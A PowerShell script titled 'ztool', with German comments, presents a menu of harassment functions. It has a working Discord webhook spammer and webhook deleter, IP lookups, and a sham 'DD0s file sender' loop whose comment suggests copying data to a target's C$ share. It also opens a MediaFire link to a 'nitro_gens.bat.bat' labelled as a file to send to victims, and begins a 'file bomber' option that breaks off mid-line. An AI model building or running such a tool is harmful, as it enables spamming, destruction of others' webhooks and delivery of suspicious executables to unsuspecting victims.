# Farben definieren
$color_red = "4"
$color_blue = "1"
$color_green = "2"
$color_turquoise = "3"
$color_magenta = "5"
$color_yellow = "6"
$color_white = "7"
$color_grey = "8"
$color_light_blue = "9"
$color_light_green = "A"
$color_light_turquoise = "B"
$color_light_red = "C"
$color_light_magenta = "D"
$color_light_yellow = "E"
$color_light_white = "F"
$color_black = "0"

# Hauptmenü
function Main-Menu {
    Clear-Host
    Write-Host "=============================="
    Write-Host "ztool"
    Write-Host "=============================="
    Write-Host "1. Send Discord Webhook Message"
    Write-Host "2. Delete Discord Webhook"
    Write-Host "3. IP Address Lookup"
    Write-Host "4. What's My IP?"
    Write-Host "5. DD0s file sender"
    Write-Host "6. send victim file. spamming apps"
    Write-Host "7. Open Nitro Gen"
    Write-Host "8. Color Switch for GUI"
    Write-Host "9. file bomber install and send to victim!!!"
    Write-Host "0. Exit"
    Write-Host "=============================="
    $choice = Read-Host "Please choose an option (0-9)"
    
    switch ($choice) {
        "1" { Webhook-Spammer }
        "2" { Webhook-Deleter }
        "3" { IP-Lookup }
        "4" { What-Is-My-IP }
        "5" { File-Sender }
        "6" { Open-Link }
        "7" { Open-Nitro-Gen }
        "8" { Color-Switch }
        "9" { Install-File }
        "0" { exit }
        default { Write-Host "Invalid option! Please choose again."; Pause; Main-Menu }
    }
}

# Funktionen definieren

function Webhook-Spammer {
    Clear-Host
    Write-Host "=============================="
    Write-Host "Discord Webhook Spammer"
    Write-Host "=============================="
    $webhook_url = Read-Host "Enter Discord webhook URL"
    $message = Read-Host "Enter message to spam"
    $message_count = Read-Host "Enter number of messages to send"

    Write-Host "Spamming Discord webhook $webhook_url with $message_count messages..."
    for ($i=1; $i -le $message_count; $i++) {
        Write-Host "Sending message $i..."
        Invoke-RestMethod -Uri $webhook_url -Method Post -ContentType 'application/json' -Body (@{content=$message} | ConvertTo-Json)
    }
    Write-Host "Webhook spam complete."
    Pause
    Main-Menu
}

function Webhook-Deleter {
    Clear-Host
    Write-Host "=============================="
    Write-Host "Delete Discord Webhook"
    Write-Host "=============================="
    $webhook_url = Read-Host "Enter Discord webhook URL to delete"
    Write-Host "Deleting Discord webhook $webhook_url..."
    Invoke-RestMethod -Uri $webhook_url -Method Delete
    Write-Host "Webhook deleted."
    Pause
    Main-Menu
}

function IP-Lookup {
    Clear-Host
    Write-Host "=============================="
    Write-Host "IP Address Lookup"
    Write-Host "=============================="
    $ip_address = Read-Host "Enter IP address to lookup"
    Write-Host "Looking up information for IP address $ip_address..."
    Invoke-RestMethod -Uri "https://ipinfo.io/$ip_address/json" | Format-List
    Pause
    Main-Menu
}

function What-Is-My-IP {
    Clear-Host
    Write-Host "=============================="
    Write-Host "What's My IP?"
    Write-Host "=============================="
    Write-Host "Retrieving your current IP address..."
    Invoke-RestMethod -Uri "https://ipinfo.io/ip"
    Pause
    Main-Menu
}

function File-Sender {
    Clear-Host
    Write-Host "=============================="
    Write-Host "File Sender"
    Write-Host "=============================="
    $ip = Read-Host "Enter IP address to send file to"
    $num_gb = Read-Host "Enter number of gigabytes to send"
    
    if ($num_gb -lt 1) {
        Write-Host "Input must be at least 1."
        Pause
        Main-Menu
    }

    for ($i=1; $i -le $num_gb; $i++) {
        Write-Host "Sending file: 1 GB to $ip - Packet $i"
        # Hier könnte die tatsächliche Dateiübertragung stattfinden, z.B. mit geeigneten Netzwerkübertragungsmethoden wie ftp, scp, rsync usw.
        # Beispiel: xcopy /s data.dat \\$ip\c$
        Start-Sleep -Seconds 2
    }

    Write-Host "File sent successfully to $ip."
    Pause
    Main-Menu
}

function Open-Link {
    Clear-Host
    Write-Host "=============================="
    Write-Host "Open Link"
    Write-Host "=============================="
    Write-Host "Opening link: https://www.mediafire.com/file/vq2259ec6q0tkow/nitro_gens.bat.bat/file"
    Start-Process "https://www.mediafire.com/file/vq2259ec6q0tkow/nitro_gens.bat.bat/file"
    Pause
    Main-Menu
}

function Open-Nitro-Gen {
    Clear-Host
    Write-Host "=============================="
    Write-Host "Open Nitro Gen"
    Write-Host "=============================="
    Write-Host "Opening Nitro Gen: https://nitro-gen-nine.vercel.app/"
    Start-Process "https://nitro-gen-nine.vercel.app/"
    Pause
    Main-Menu
}

function Color-Switch {
    Clear-Host
    Write-Host "=============================="
    Write-Host "Color Switch for GUI"
    Write-Host "=============================="
    Write-Host "Choose a color for the GUI:"
    Write-Host "1. Red"
    Write-Host "2. Blue"
    Write-Host "3. Green"
    Write-Host "4. Turquoise"
    Write-Host "5. Magenta"
    Write-Host "6. Yellow"
    Write-Host "7. White"
    Write-Host "8. Grey"
    Write-Host "9. Light Blue"
    Write-Host "A. Light Green"
    Write-Host "B. Light Turquoise"
    Write-Host "C. Light Red"
    Write-Host "D. Light Magenta"
    Write-Host "E. Light Yellow"
    Write-Host "F. Light White"
    Write-Host "X. Rainbow Animation"
    Write-Host "=============================="
    $color_choice = Read-Host "Enter color choice (1-9, A-F, X)"
    
    switch -Wildcard ($color_choice.ToUpper()) {
        "1" { $color_choice = $color_red }
        "2" { $color_choice = $color_blue }
        "3" { $color_choice = $color_green }
        "4" { $color_choice = $color_turquoise }
        "5" { $color_choice = $color_magenta }
        "6" { $color_choice = $color_yellow }
        "7" { $color_choice = $color_white }
        "8" { $color_choice = $color_grey }
        "9" { $color_choice = $color_light_blue }
        "A" { $color_choice = $color_light_green }
        "B" { $color_choice = $color_light_turquoise }
        "C" { $color_choice = $color_light_red }
        "D" { $color_choice = $color_light_magenta }
        "E" { $color_choice = $color_light_yellow }
        "F" { $color_choice = $color_light_white }
        "X" { Rainbow-Animation; return }
    }

    # Farbe anwenden und zurück zum Hauptmenü
    Write-Host "Color changed to $color_choice."
    Pause
    Main-Menu
}

function Rainbow-Animation {
    Clear-Host
    Write-Host "=============================="
    Write-Host "Rainbow Animation"
    Write-Host "=============================="
    Write-Host "Press Ctrl+C to stop the animation."
    $chars = "\|/-"
    while ($true) {
        foreach ($char in $chars) {
            for ($i=1; $i -le 15; $i++) {
                Write-Host $char
                Start-Sleep -Milliseconds 100
                $chars = $chars.Substring(1) + $chars[0]
                Clear-Host
            }
        }
    }
}

function Install-File {
    Clear-Host
    Write-Host "=============================="
    Write-Host "Install File"
    Write-Host "=============================="
    Write-Host "Installing file: C:\Users\Korbu\Desktop\surccecode.bat - Kopie800
